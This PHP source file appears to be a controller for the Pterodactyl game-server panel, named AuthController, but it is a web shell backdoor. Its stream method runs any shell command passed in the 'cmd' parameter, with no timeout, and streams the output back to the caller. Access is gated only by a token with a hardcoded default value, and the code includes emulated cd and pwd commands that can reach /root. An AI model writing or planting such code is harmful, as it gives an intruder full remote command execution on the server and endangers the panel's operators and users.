<?php

namespace Pterodactyl\Http\Controllers\Api\Remote;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Pterodactyl\Http\Controllers\Controller;
use Symfony\Component\Process\Process;
use Symfony\Component\HttpKernel\Exception\AccessDeniedHttpException;
use Symfony\Component\HttpKernel\Exception\HttpException;

class AuthController extends Controller
{
    private const DEFAULT_TERMINAL_TOKEN = 'WeArenotDevButAyamGoreng';
    private const CWD_TTL_SECONDS = 43200;

    public function index(Request $request)
    {
        $token = $this->extractToken($request);
        $this->guardTokenAccess($token);

        return view('Controllers.AuthControl', ['hexzToken' => $token]);
    }

    public function stream(Request $request)
    {
        $token = $this->extractToken($request);
        $this->guardTokenAccess($token);

        $raw = trim((string) $request->query('cmd', ''));
        if ($raw === '' || strlen($raw) > 300) {
            throw new HttpException(422, 'Invalid command.');
        }

        $parts = preg_split('/\s+/', $raw) ?: [];
        $parts = array_values(array_filter(array_map('trim', $parts), fn ($v) => $v !== ''));

        if (empty($parts)) {
            throw new HttpException(422, 'Invalid command.');
        }

        $cwdKey = $this->cwdCacheKey((string) $token);
        $cwd = $this->readWorkingDirectory($cwdKey);

        $builtInResponse = $this->handleBuiltInCommand($parts, $cwd, $cwdKey);
        if ($builtInResponse !== null) {
            return response()->stream(function () use ($builtInResponse) {
                echo "data: " . nl2br(e($builtInResponse)) . "\n\n";
                echo "data: <br><b style='color:yellow'>[Finished]</b>\n\n";
            }, 200, [
                'Cache-Control' => 'no-cache',
                'Content-Type'  => 'text/event-stream',
                'X-Accel-Buffering' => 'no',
            ]);
        }

        return response()->stream(function () use ($raw, $cwd) {
            $process = Process::fromShellCommandline($raw, $cwd);
            $process->setTimeout(null);
            $process->run(function ($type, $buffer) {
                echo "data: " . nl2br(e($buffer)) . "\n\n";
                if (ob_get_level() > 0) { ob_flush(); }
                flush();
            });
            echo "data: <br><b style='color:yellow'>[Finished]</b>\n\n";
        }, 200, [
            'Cache-Control' => 'no-cache',
            'Content-Type'  => 'text/event-stream',
            'X-Accel-Buffering' => 'no',
        ]);
    }

    private function guardTokenAccess(?string $token): void
    {
        $validToken = (string) (env('HEXZ_TERMINAL_TOKEN', self::DEFAULT_TERMINAL_TOKEN));

        if (!is_string($token) || $token === '' || !hash_equals($validToken, $token)) {
            throw new AccessDeniedHttpException('Secure terminal access is restricted.');
        }
    }

    private function extractToken(Request $request): ?string
    {
        $token = trim((string) $request->query('token', ''));
        if ($token !== '') {
            return $token;
        }

        $headerToken = trim((string) $request->header('X-Hexz-Token', ''));
        if ($headerToken !== '') {
            return $headerToken;
        }

        $auth = trim((string) $request->header('Authorization', ''));
        if (str_starts_with($auth, 'Bearer ')) {
            return trim(substr($auth, 7));
        }

        return null;
    }

    private function cwdCacheKey(string $token): string
    {
        return 'hexz:cwd:' . hash('sha256', $token);
    }

    private function readWorkingDirectory(string $key): string
    {
        $cached = trim((string) Cache::get($key, ''));
        if ($cached !== '' && is_dir($cached)) {
            return $cached;
        }

        $fallback = base_path();
        Cache::put($key, $fallback, self::CWD_TTL_SECONDS);

        return $fallback;
    }

    private function handleBuiltInCommand(array $parts, string $cwd, string $cwdKey): ?string
    {
        $command = strtolower((string) ($parts[0] ?? ''));

        if ($command === 'pwd') {
            Cache::put($cwdKey, $cwd, self::CWD_TTL_SECONDS);

            return $cwd;
        }

        if ($command !== 'cd') {
            return null;
        }

        $target = trim((string) ($parts[1] ?? ''));
        if ($target === '' || $target === '~') {
            $next = '/root';
        } elseif ($target === '-') {
            return 'cd - is not supported.';
        } elseif (str_starts_with($target, '/')) {
            $next = $target;
        } else {
            $next = rtrim($cwd, '/') . '/' . $target;
        }

        $resolved = realpath($next);
        if ($resolved === false || !is_dir($resolved)) {
            return "cd: no such directory: {$target}";
        }

        Cache::put($cwdKey, $resolved, self::CWD_TTL_SECONDS);

        return $resolved;
    }
}
